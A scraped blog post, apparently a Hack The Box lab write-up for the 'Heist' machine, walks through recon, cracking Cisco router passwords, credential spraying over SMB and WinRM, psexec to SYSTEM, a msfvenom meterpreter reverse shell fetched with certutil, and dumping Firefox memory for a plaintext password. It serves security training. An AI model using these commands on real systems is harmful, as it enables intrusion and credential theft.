Microsoft Windows [Version 10.0.17763.437] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;whoami nt authority\system C:\Windows\system32&gt;cd C:\Users\Administrator\Desktop C:\Users\Administrator\Desktop&gt;more root.txt 50dfXXXXXXXXXXXXXXXXXXXXXXXXXXXX root.txt (2) So apparently there was another or more “proper” way to solving this box by using a very certain process. But first, lets upgrade to a meterpreter shell. To do so, we will first need to create our executable which will establish the reverse connection back to our listener. After that, move the executable into the directory that the SimpleHTTPServer is running from. 1 2 3 4 5 6 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XXX.XXX LPORT=1337 -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes And we start our listener on port 1337… 1 2 3 4 5 6 7 8 9 10 11 $ msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set LPORT 1337 LPORT =&gt; 1337 msf5 exploit(multi/handler) &gt; set LHOST 10.10.XXX.XXX LHOST =&gt; 10.10.14.61 msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.XXX.XXX:1337 Back to our WinRM shell, we retrieve the executable from our SimpleHTTPServer using certutil.exe and run it. 1 2 3 4 5 6 PS supportdesk\chase@SUPPORTDESK Chase&gt; certutil.exe -urlcache -split -f http://10.10.XXX.XXX/shell.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. PS supportdesk\chase@SUPPORTDESK Documents&gt; cmd.exe /k shell.exe Back on our listener, we obtained a meterpreter shell. 1 2 3 4 [*] Sending stage (179779 bytes) to 10.10.10.149 [*] Meterpreter session 1 opened (10.10.XXX.XXX:1337 -&gt; 10.10.10.149:49694) at 2019-08-31 09:04:09 -0400 meterpreter &gt; When we list all the processes running on the box using the ps command, we noticed that firefox.exe is currently running. 1 2 3 4 5 6 7 8 9 10 11 meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 796 4660 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe 1620 796 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe 2264 796 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe 5912 796 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe 6068 796 firefox.exe x64 1 SUPPORTDESK\Chase C:\Program Files\Mozilla Firefox\firefox.exe Lets try to dump out the process’s memory to see if we can extract any credentials! I will be using Sysinternals’s procdump.exe. Since we already have a meterpreter shell, we can just use the upload command to transfer it over. 1 2 3 4 meterpreter &gt; upload procdump.exe [*] uploading : procdump.exe -&gt; procdump.exe [*] Uploaded 636.16 KiB of 636.16 KiB (100.0%): procdump.exe -&gt; procdump.exe [*] uploaded : procdump.exe -&gt; procdump.exe Next up, we spawn a cmd.exe shell and run procdump.exe on the firefox.exe process. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 meterpreter &gt; shell Process 3708 created. Channel 102 created. Microsoft Windows [Version 10.0.17763.437] (c) 2018 Microsoft Corporation. All rights reserved. C:\Users\Chase&gt;procdump.exe -accepteula -ma 796 procdump.exe -accepteula -ma 796 ProcDump v9.0 - Sysinternals process dump utility Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com [19:30:23] Dump 1 initiated: C:\Users\Chase\firefox.exe_190831_193023.dmp [19:30:24] Dump 1 writing: Estimated dump file size is 473 MB. [19:30:29] Dump 1 complete: 474 MB written in 5.2 seconds [19:30:29] Dump count reached. With that done, we exit out of our cmd.exe and use the download command to retrieve the process dump. 1 2 3 4 5 6 C:\Users\Chase&gt;exit exit meterpreter &gt; download C:\\Users\\Chase\\firefox.exe_190831_193023.dmp [*] Downloading: C:\Users\Chase\firefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp [*] Downloaded 462.05 MiB of 462.05 MiB (100.0%): C:\Users\Chase\firefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp [*] download : C:\Users\Chase\firefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp The final step is simply to run strings on it and grep for password. There were many lines containing password but I came across this line: 1 :http://localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login= The password seems to be the value for login_password. Refer to root.txt (1) on how to establish a shell using the credentials we found. Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/heist-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/heist-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-12-02T00:27:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Heist" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/heist-htb/"},"description":"Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. Always remember to map a domain name to the machine’s IP address to ease your rooting ! 1 $ echo &quot;10.10.10.149 heist.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ nmap -sV -sT -sC heist.htb Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-17 10:31 EDT Nmap scan report for heist.htb (10.10.10.149) Host is up (0.27s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 | http-title: Support Login Page |_Requested resource was login.php 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 30s, deviation: 0s, median: 30s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-08-17 10:32:16 |_ start_date: N/A 5985/tcp open wsman 49669/tcp open unknown Lets first check out the http service on port 80. We don’t have any credentials so lets try to login as a guest. /issues.php: This looks like a IT helpdesk ticketing system. It looks like Hazard is having issues with his cisco router and he has posted his configuration file. /attachments/config.txt: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 version 12.2 no service pad service password-encryption ! isdn switch-type basic-5ess ! hostname ios-1 ! security passwords min-length 12 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 ! username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 ! ! ip ssh authentication-retries 5 ip ssh version 2 ! ! router bgp 100 synchronization bgp log-neighbor-changes bgp dampening network 192.168.0.0Â mask 300.255.255.0 timers bgp 3 9 redistribute connected ! ip classless ip route 0.0.0.0 0.0.0.0 192.168.0.1 ! ! access-list 101 permit ip any any dialer-list 1 protocol ip list 101 ! no ip http server no ip http secure-server ! line vty 0 4 session-timeout 600 authorization exec SSH transport input ssh First thing to note is 1 service password-encryption which tells us that all passwords in the configuration file are encrypted. Next up, we get 1 enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 which has a Type 5 encrypted password. To crack it, I will be using this tool. 1 2 3 4 5 6 7 8 9 10 11 12 $ python3 cisco_pwdecrypt.py -u &quot;\\$1\\$pdQG\\$o8nrSzsGXeaduXrjlvKc91&quot; -d /usr/share/wordlists/rockyou.txt [*] Bruteforcing &#39;type 5&#39; hash... Found 14344392 passwords to test. Testing: $1$pdQG$o8nrSzsGXeaduXrjlvKc91 Hash Type = MD5 Salt = pdQG Hash = o8nrSzsGXeaduXrjlvKc91 [Status] 132/14344392 password tested... [*] Password Found = stealth1agent Lastly, we have 1 2 username rout3r password 7 0242114B0E143F015F5D1E161713 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 which both contains a username and a Type 7 encrypted password. To crack them, I will be using the same tool. 1 2 3 4 5 $ python3 cisco_pwdecrypt.py -t 0242114B0E143F015F5D1E161713 [*] Result: $uperP@ssword $ python3 cisco_pwdecrypt.py -t 02375012182C1A1D751618034F36415408 [*] Result: Q4)sJu\\Y8qz*A3?d With all the credentials we have collected so far, lets create 2 files to store them. user.txt: 1 2 3 4 Hazard hazard rout3r admin pass.txt: 1 2 3 stealth1agent $uperP@ssword Q4)sJu\\Y8qz*A3?d With some credentials, lets move on to the smb service on port 445. I will be using the auxiliary/scanner/smb/smb_login module in Metasploit to test the different combinations. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ msfconsole msf5 &gt; use auxiliary/scanner/smb/smb_login msf5 auxiliary(scanner/smb/smb_login) &gt; set RHOSTS heist.htb RHOSTS =&gt; heist.htb msf5 auxiliary(scanner/smb/smb_login) &gt; set USER_FILE user.txt USER_FILE =&gt; user.txt msf5 auxiliary(scanner/smb/smb_login) &gt; set PASS_FILE pass.txt PASS_FILE =&gt; pass.txt msf5 auxiliary(scanner/smb/smb_login) &gt; set THREADS 50 THREADS =&gt; 50 msf5 auxiliary(scanner/smb/smb_login) &gt; set VERBOSE false VERBOSE =&gt; false msf5 auxiliary(scanner/smb/smb_login) &gt; run [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;.\\Hazard:stealth1agent&#39; [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;.\\hazard:stealth1agent&#39; [*] heist.htb:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Using hazard:stealth1agent, lets see what we can access in the smb shares! 1 2 3 4 5 6 7 8 9 $ smbmap -H heist.htb -u hazard -p stealth1agent [+] Finding open SMB ports.... [+] User SMB session establishd on heist.htb... [+] IP: heist.htb:445 Name: heist.htb Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY I guess the smb service is a dead end? Maybe not. Using Impacket’s lookupsid.py, we are able to enumerate for other users on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 $ python lookupsid.py Hazard:stealth1agent@heist.htb Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Brute forcing SIDs at 10.10.10.149 [*] StringBinding ncacn_np:10.10.10.149[\\pipe\\lsarpc] [*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112 500: SUPPORTDESK\\Administrator (SidTypeUser) 501: SUPPORTDESK\\Guest (SidTypeUser) 503: SUPPORTDESK\\DefaultAccount (SidTypeUser) 504: SUPPORTDESK\\WDAGUtilityAccount (SidTypeUser) 513: SUPPORTDESK\\None (SidTypeGroup) 1008: SUPPORTDESK\\Hazard (SidTypeUser) 1009: SUPPORTDESK\\support (SidTypeUser) 1012: SUPPORTDESK\\Chase (SidTypeUser) 1013: SUPPORTDESK\\Jason (SidTypeUser) From this, we are able to find out that the domain is SUPPORTDESK. With these new users, lets update our user.txt. 1 2 3 4 5 6 7 8 Hazard hazard rout3r admin Chase Jason support Administrator And run the auxiliary/scanner/smb/smb_login module again. 1 2 3 4 5 6 7 8 9 msf5 auxiliary(scanner/smb/smb_login) &gt; set DOMAIN SUPPORTDESK DOMAIN =&gt; SUPPORTDESK msf5 auxiliary(scanner/smb/smb_login) &gt; run [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;SUPPORTDESK\\Hazard:stealth1agent&#39; [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;SUPPORTDESK\\hazard:stealth1agent&#39; [+] 10.10.10.149:445 - 10.10.10.149:445 - Success: &#39;SUPPORTDESK\\Chase:Q4)sJu\\Y8qz*A3?d&#39; [*] heist.htb:445 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed Alright! We got another set of credentials! Lets try to access the smb shares using Chase:Q4)sJu\\Y8qz*A3?d! 1 2 3 4 5 6 7 8 9 $ smbmap -H heist.htb -u Chase -p &quot;Q4)sJu\\Y8qz*A3?d&quot; -d SUPPORTDESK [+] Finding open SMB ports.... [+] User SMB session establishd on heist.htb... [+] IP: heist.htb:445 Name: heist.htb Disk Permissions ---- ----------- ADMIN$ NO ACCESS C$ NO ACCESS IPC$ READ ONLY Still nothing? I guess the smb service really is a dead end :( If we go back to our reconnaissance results, there is actually one more service on port 5985: wsman. After some research, the wsman service is the WinRM service on the machine. Could we possbily use it to remotely execute commands on the machine? But first, we need to know what credentials we can use by using the auxiliary/scanner/winrm/winrm_login module in Metasploit. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 msf5 auxiliary(scanner/smb/smb_login) &gt; use auxiliary/scanner/winrm/winrm_login msf5 auxiliary(scanner/winrm/winrm_login) &gt; set RHOSTS heist.htb RHOSTS =&gt; heist.htb msf5 auxiliary(scanner/winrm/winrm_login) &gt; set USER_FILE username.txt USER_FILE =&gt; username.txt msf5 auxiliary(scanner/winrm/winrm_login) &gt; set PASS_FILE password.txt PASS_FILE =&gt; password.txt msf5 auxiliary(scanner/winrm/winrm_login) &gt; set THREADS 50 THREADS =&gt; 50 msf5 auxiliary(scanner/winrm/winrm_login) &gt; set VERBOSE false VERBOSE =&gt; false msf5 auxiliary(scanner/winrm/winrm_login) &gt; set DOMAIN SUPPORTDESK DOMAIN =&gt; SUPPORTDESK msf5 auxiliary(scanner/winrm/winrm_login) &gt; run [+] 10.10.10.149:5985 - Login Successful: SUPPORTDESK\\Chase:Q4)sJu\\Y8qz*A3?d [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed user.txt Okay… So the same Chase user have access to both the smb and WinRM service. To establish a shell, I used Alamot’s winrm_shell.rb with the following configuration settings: 1 2 3 4 5 6 7 8 require &#39;winrm&#39; conn = WinRM::Connection.new( endpoint: &#39;http://10.10.10.149:5985/wsman&#39;, transport: :ssl, user: &#39;SUPPORTDESK\\Chase&#39;, password: &#39;Q4)sJu\\Y8qz*A3?d&#39;, :no_ssl_peer_verification =&gt; true ) And now we execute the WinRM shell… 1 2 3 4 5 6 7 8 9 10 11 12 13 $ ruby winrm_shell.rb PS supportdesk\\chase@SUPPORTDESK Documents&gt; cd .. PS supportdesk\\chase@SUPPORTDESK Chase&gt; cd Desktop PS supportdesk\\chase@SUPPORTDESK Desktop&gt; dir Directory: C:\\Users\\Chase\\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/22/2019 9:08 AM 121 todo.txt -a---- 4/22/2019 9:07 AM 32 user.txt PS supportdesk\\chase@SUPPORTDESK Desktop&gt; more user.txt a127XXXXXXXXXXXXXXXXXXXXXXXXXXXX root.txt (1) When I first did this machine, I found the SHA-256 hash of the Administrator’s password which I was able to somehow crack it using an online website. From what we know, there was a IIS web server running on port 80 so I checked out C:\\inetpub\\wwwroot. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 PS supportdesk\\chase@SUPPORTDESK inetpub&gt; dir Volume in drive C has no label. Volume Serial Number is 78E3-E62D Directory of C:\\inetpub\\wwwroot 04/21/2019 05:42 PM &lt;DIR&gt; . 04/21/2019 05:42 PM &lt;DIR&gt; .. 04/21/2019 05:41 PM &lt;DIR&gt; attachments 04/21/2019 05:41 PM &lt;DIR&gt; css 04/21/2019 11:51 AM 1,240 errorpage.php 04/21/2019 05:41 PM &lt;DIR&gt; images 04/21/2019 11:33 AM 279 index.php 04/22/2019 08:38 AM 3,034 issues.php 04/21/2019 05:41 PM &lt;DIR&gt; js 04/22/2019 06:48 AM 2,657 login.php 4 File(s) 7,210 bytes 6 Dir(s) 7,923,224,576 bytes free I skimmed through the pages until I came across login.php. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 &lt;?php session_start(); if( isset($_REQUEST[&#39;login&#39;]) &amp;&amp; !empty($_REQUEST[&#39;login_username&#39;]) &amp;&amp; !empty($_REQUEST[&#39;login_password&#39;])) { if( $_REQUEST[&#39;login_username&#39;] === &#39;admin@support.htb&#39; &amp;&amp; hash( &#39;sha256&#39;, $_REQUEST[&#39;login_password&#39;]) === &#39;91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040&#39;) { $_SESSION[&#39;admin&#39;] = &quot;valid&quot;; header(&#39;Location: issues.php&#39;); } else header(&#39;Location: errorpage.php&#39;); } else if( isset($_GET[&#39;guest&#39;]) ) { if( $_GET[&#39;guest&#39;] === &#39;true&#39; ) { $_SESSION[&#39;guest&#39;] = &quot;valid&quot;; header(&#39;Location: issues.php&#39;); } } ?&gt; The SHA-256 hash of the admin’s password was hardcoded in login.php. I immediately tried different online password cracking websites until I came across this website. I supplied the hash and got the password 4dD!5}x/re8]FBuZ. Using Impacket’s psexec.py, I was able to establish a shell. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ python psexec.py Administrator:&#39;4dD!5}x/re8]FBuZ&#39;@heist.htb Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation [*] Requesting shares on heist.htb..... [*] Found writable share ADMIN$ [*] Uploading file igPymROC.exe [*] Opening SVCManager on heist.htb..... [*] Creating service KKCH on heist.htb..... [*] Starting service KKCH..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.17763.437] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32&gt;whoami nt authority\\system C:\\Windows\\system32&gt;cd C:\\Users\\Administrator\\Desktop C:\\Users\\Administrator\\Desktop&gt;more root.txt 50dfXXXXXXXXXXXXXXXXXXXXXXXXXXXX root.txt (2) So apparently there was another or more “proper” way to solving this box by using a very certain process. But first, lets upgrade to a meterpreter shell. To do so, we will first need to create our executable which will establish the reverse connection back to our listener. After that, move the executable into the directory that the SimpleHTTPServer is running from. 1 2 3 4 5 6 $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.XXX.XXX LPORT=1337 -f exe &gt; shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder or badchars specified, outputting raw payload Payload size: 341 bytes Final size of exe file: 73802 bytes And we start our listener on port 1337… 1 2 3 4 5 6 7 8 9 10 11 $ msfconsole msf5 &gt; use exploit/multi/handler msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) &gt; set LPORT 1337 LPORT =&gt; 1337 msf5 exploit(multi/handler) &gt; set LHOST 10.10.XXX.XXX LHOST =&gt; 10.10.14.61 msf5 exploit(multi/handler) &gt; run [*] Started reverse TCP handler on 10.10.XXX.XXX:1337 Back to our WinRM shell, we retrieve the executable from our SimpleHTTPServer using certutil.exe and run it. 1 2 3 4 5 6 PS supportdesk\\chase@SUPPORTDESK Chase&gt; certutil.exe -urlcache -split -f http://10.10.XXX.XXX/shell.exe **** Online **** 000000 ... 01204a CertUtil: -URLCache command completed successfully. PS supportdesk\\chase@SUPPORTDESK Documents&gt; cmd.exe /k shell.exe Back on our listener, we obtained a meterpreter shell. 1 2 3 4 [*] Sending stage (179779 bytes) to 10.10.10.149 [*] Meterpreter session 1 opened (10.10.XXX.XXX:1337 -&gt; 10.10.10.149:49694) at 2019-08-31 09:04:09 -0400 meterpreter &gt; When we list all the processes running on the box using the ps command, we noticed that firefox.exe is currently running. 1 2 3 4 5 6 7 8 9 10 11 meterpreter &gt; ps Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 796 4660 firefox.exe x64 1 SUPPORTDESK\\Chase C:\\Program Files\\Mozilla Firefox\\firefox.exe 1620 796 firefox.exe x64 1 SUPPORTDESK\\Chase C:\\Program Files\\Mozilla Firefox\\firefox.exe 2264 796 firefox.exe x64 1 SUPPORTDESK\\Chase C:\\Program Files\\Mozilla Firefox\\firefox.exe 5912 796 firefox.exe x64 1 SUPPORTDESK\\Chase C:\\Program Files\\Mozilla Firefox\\firefox.exe 6068 796 firefox.exe x64 1 SUPPORTDESK\\Chase C:\\Program Files\\Mozilla Firefox\\firefox.exe Lets try to dump out the process’s memory to see if we can extract any credentials! I will be using Sysinternals’s procdump.exe. Since we already have a meterpreter shell, we can just use the upload command to transfer it over. 1 2 3 4 meterpreter &gt; upload procdump.exe [*] uploading : procdump.exe -&gt; procdump.exe [*] Uploaded 636.16 KiB of 636.16 KiB (100.0%): procdump.exe -&gt; procdump.exe [*] uploaded : procdump.exe -&gt; procdump.exe Next up, we spawn a cmd.exe shell and run procdump.exe on the firefox.exe process. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 meterpreter &gt; shell Process 3708 created. Channel 102 created. Microsoft Windows [Version 10.0.17763.437] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Users\\Chase&gt;procdump.exe -accepteula -ma 796 procdump.exe -accepteula -ma 796 ProcDump v9.0 - Sysinternals process dump utility Copyright (C) 2009-2017 Mark Russinovich and Andrew Richards Sysinternals - www.sysinternals.com [19:30:23] Dump 1 initiated: C:\\Users\\Chase\\firefox.exe_190831_193023.dmp [19:30:24] Dump 1 writing: Estimated dump file size is 473 MB. [19:30:29] Dump 1 complete: 474 MB written in 5.2 seconds [19:30:29] Dump count reached. With that done, we exit out of our cmd.exe and use the download command to retrieve the process dump. 1 2 3 4 5 6 C:\\Users\\Chase&gt;exit exit meterpreter &gt; download C:\\\\Users\\\\Chase\\\\firefox.exe_190831_193023.dmp [*] Downloading: C:\\Users\\Chase\\firefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp [*] Downloaded 462.05 MiB of 462.05 MiB (100.0%): C:\\Users\\Chase\\firefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp [*] download : C:\\Users\\Chase\\firefox.exe_190831_193023.dmp -&gt; firefox.exe_190831_193023.dmp The final step is simply to run strings on it and grep for password. There were many lines containing password but I came across this line: 1 :http://localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login= The password seems to be the value for login_password. Refer to root.txt (1) on how to establish a shell using the credentials we found. Rooted ! Thank you for reading and look forward for more writeups and articles !","url":"https://rizemon.github.io/posts/heist-htb/","@type":"BlogPosting","headline":"Hack The Box - Heist","dateModified":"2021-01-03T20:34:47+08:00","datePublished":"2019-12-02T00:27:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Heist | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode 